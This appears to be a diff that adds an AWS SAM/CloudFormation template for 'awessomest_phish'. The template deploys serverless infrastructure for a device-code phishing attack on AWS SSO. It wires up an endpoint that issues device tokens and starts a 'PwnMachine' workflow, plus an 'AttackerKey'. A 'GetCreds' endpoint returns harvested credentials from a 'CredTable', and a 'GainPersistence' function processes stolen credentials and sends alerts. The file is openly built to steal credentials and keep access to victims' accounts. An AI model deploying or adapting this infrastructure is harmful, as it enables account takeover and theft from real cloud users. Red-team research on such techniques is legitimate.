@@ -1,0 +1,179 @@
+AWSTemplateFormatVersion: '2010-09-09'
+Transform: AWS::Serverless-2016-10-31
+Description: >
+  awessomest_phish
+
+  Lambda CFN Stack
+
+Globals:
+  Function:
+    CodeUri: ../functions/
+    Runtime: python3.11
+    Timeout: 3
+    MemorySize: 128
+
+Parameters:
+  STARTURL:
+    Description: Start URL
+    Type: String
+  REGION:
+    Description: Region
+    Type: String
+  STAGE:
+    Description: API GW Stage Name
+    Type: String
+    Default: Prod
+  STATESARN:
+    Description: PwnMachine ARN
+    Type: String
+  TABLENAME:
+    Description: CredTable Name
+    Type: String
+  TABLEARN:
+    Description: CredTable Name
+    Type: String
+  QUEUEURL:
+    Description: CredQueue URL
+    Type: String
+  QUEUEARN:
+    Description: CredQueue ARN
+    Type: String
+  CFNBUCKET:
+    Description: Cloudoformation S3 URL
+    Type: String
+  PWNNOTIFICATION:
+    Description: PwnNotificaiton SNS Topic ARN
+    Type: String
+
+Resources:
+  Api:
+    Type: AWS::Serverless::Api
+    Properties:
+      StageName: !Ref STAGE
+
+  AttackerKey:
+    Type: 'AWS::ApiGateway::ApiKey'
+    DependsOn:
+      - Api
+    Properties:
+      Name: AttackerKey
+      Enabled: true
+
+  UsagePlan:
+    Type: 'AWS::ApiGateway::UsagePlan'
+    Properties:
+      ApiStages:
+        - ApiId: !Ref Api
+          Stage: !Ref STAGE
+
+  UsagePlanKey:
+    Type: 'AWS::ApiGateway::UsagePlanKey'
+    Properties:
+      KeyId: !Ref AttackerKey
+      KeyType: API_KEY
+      UsagePlanId: !Ref UsagePlan
+  
+  CreateDeviceToken:
+    Type: AWS::Serverless::Function 
+    Properties:
+      Handler:  create_device_token.lambda_handler
+      Environment:
+        Variables:
+          STARTURL: !Ref STARTURL
+          REGION: !Ref REGION
+          STATESARN: !Ref STATESARN
+      Architectures:
+        - x86_64
+      Policies:
+      - Statement:
+        - Sid: StatesInvoke
+          Effect: Allow
+          Action:
+            - states:StartExecution
+          Resource: !Ref STATESARN
+      Events:
+        Url:
+          Type: Api 
+          Properties:
+            Path: /
+            Method: get
+            RestApiId: !Ref Api
+
+  GetCreds:
+    Type: AWS::Serverless::Function 
+    Properties:
+      Handler:  get_creds.lambda_handler
+      Environment:
+        Variables:
+          REGION: !Ref REGION
+          TABLENAME: !Ref TABLENAME
+      Architectures:
+        - x86_64
+      Policies:
+      - Statement:
+        - Sid: PwnTableRead
+          Effect: Allow
+          Action:
+            - dynamodb:GetItem
+            - dynamodb:Scan
+          Resource: !Ref TABLEARN
+      Events:
+        Url:
+          Type: Api 
+          Properties:
+            Path: /Get_Creds
+            Method: get
+            RestApiId: !Ref Api
+            Auth:
+              ApiKeyRequired: true
+          
+  GainPersistence:
+    Type: AWS::Serverless::Function
+    Properties:
+      Handler:  gain_persistence.lambda_handler
+      Timeout: 120
+      Environment:
+        Variables:
+          REGION: !Ref REGION
+          QUEUEURL: !Ref QUEUEURL
+          CFNBUCKET: !Ref CFNBUCKET
+          TABLENAME: !Ref TABLENAME
+          SNSARN: !Ref PWNNOTIFICATION
+      Policies:
+      - Statement:
+        - Sid: SQSReadandDelete
+          Effect: Allow
+          Action:
+            - sqs:GetQueueAttributes
+            - sqs:RecieveMessage
+            - sqs:DeleteMessage
+          Resource: !Ref QUEUEARN
+        - Sid: PwnTableRW
+          Effect: Allow
+          Action:
+            - dynamodb:PutItem
+            - dynamodb:GetItem
+            - dynamodb:Scan
+          Resource: !Ref TABLEARN
+        - Sid: SNSPublish
+          Effect: Allow
+          Action:
+            - sns:Publish
+          Resource: !Ref PWNNOTIFICATION
+      Events:
+        CredQueue:
+          Type: SQS
+          Properties:
+            BatchSize: 1
+            Queue: !Ref QUEUEARN
+  
+
+Outputs:
+  Api:
+    Description: API GW ID
+    Value: !Ref Api
+    
+  AttackerKey:
+    Description: API GW ID
+    Value: !Ref AttackerKey
+
